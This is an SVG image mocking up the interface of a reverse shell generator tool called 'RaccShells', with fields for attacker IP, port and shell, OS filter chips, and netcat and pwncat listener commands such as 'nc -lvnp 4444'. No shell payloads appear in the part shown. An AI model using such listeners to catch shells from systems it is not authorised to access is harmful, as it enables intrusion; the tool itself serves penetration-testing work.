<svg viewBox="0 0 820 480" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New', Consolas, monospace">
  <defs>
    <pattern id="scanlines" x="0" y="0" width="1" height="4" patternUnits="userSpaceOnUse">
      <rect width="1" height="2" fill="rgba(0,255,0,0.012)"/>
    </pattern>
    <filter id="glow">
      <feGaussianBlur stdDeviation="2" result="b"/>
      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>

  <!-- Background -->
  <rect width="820" height="480" fill="#0a0a0a" rx="8"/>
  <rect width="820" height="480" fill="url(#scanlines)" rx="8" opacity="0.6"/>

  <!-- Window chrome -->
  <rect width="820" height="28" fill="#0d0d0d" rx="8"/>
  <rect y="14" width="820" height="14" fill="#0d0d0d"/>
  <circle cx="18" cy="14" r="5" fill="#ff5f57"/>
  <circle cx="34" cy="14" r="5" fill="#ffbd2e"/>
  <circle cx="50" cy="14" r="5" fill="#28ca41"/>
  <text x="410" y="19" text-anchor="middle" font-size="10" fill="#333" letter-spacing="1">RaccShells — Reverse Shell Generator</text>

  <!-- Config panel -->
  <rect x="12" y="36" width="796" height="110" rx="5" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>

  <!-- Field labels -->
  <text x="24" y="56" font-size="9" fill="#444" letter-spacing="1">▸ LHOST / IP</text>
  <rect x="24" y="60" width="170" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="34" y="76" font-size="11" fill="#c0ffc0">10.10.10.10</text>

  <text x="210" y="56" font-size="9" fill="#444" letter-spacing="1">▸ PORT</text>
  <rect x="210" y="60" width="110" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="220" y="76" font-size="11" fill="#c0ffc0">4444</text>

  <text x="336" y="56" font-size="9" fill="#444" letter-spacing="1">▸ SHELL</text>
  <rect x="336" y="60" width="150" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="346" y="76" font-size="11" fill="#c0ffc0">/bin/bash</text>
  <text x="474" y="76" font-size="9" fill="#333">▾</text>

  <text x="502" y="56" font-size="9" fill="#444" letter-spacing="1">▸ LISTENER</text>
  <rect x="502" y="60" width="160" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="512" y="76" font-size="11" fill="#c0ffc0">Netcat (nc)</text>
  <text x="650" y="76" font-size="9" fill="#333">▾</text>

  <!-- Listener cmd box -->
  <rect x="24" y="100" width="780" height="36" rx="3" fill="#050f05" stroke="#0d2a0d" stroke-width="1"/>
  <text x="34" y="114" font-size="9" fill="#444" letter-spacing="1">▸ LISTENER:</text>
  <text x="118" y="114" font-size="11" fill="#00ff00" filter="url(#glow)">nc -lvnp 4444</text>
  <rect x="766" y="103" width="30" height="16" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="781" y="115" text-anchor="middle" font-size="8" fill="#555">copy</text>
  <text x="34" y="128" font-size="8" fill="#2a5a2a" letter-spacing="0.5">rlwrap nc -lvnp 4444  |  pwncat-cs -lp 4444  |  pwncat -l -p 4444</text>

  <!-- Search bar -->
  <rect x="12" y="156" width="796" height="28" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="24" y="174" font-size="11" fill="#333">/ search shells...</text>

  <!-- Filter chips -->
  <text x="12" y="204" font-size="9" fill="#333" letter-spacing="1">FILTER:</text>

  <!-- linux chip -->
  <rect x="66" y="192" width="52" height="18" rx="9" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="92" y="205" text-anchor="middle" font-size="9" fill="#f0c060">◆ linux</text>

  <!-- mac chip -->
  <rect x="124" y="192" width="44" height="18" rx="9" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="146" y="205" text-anchor="middle" font-size="9" fill="#60c0f0">◆ mac</text>

  <!-- windows chip (active) -->
  <rect x="174" y="192" width="66" height="18" rx="9" fill="#140020" stroke="#4a1070" stroke-width="1"/>
  <text x="207" y="205" text-anchor="middle" font-size="9" fill="#a060f0">◆ windows</text>

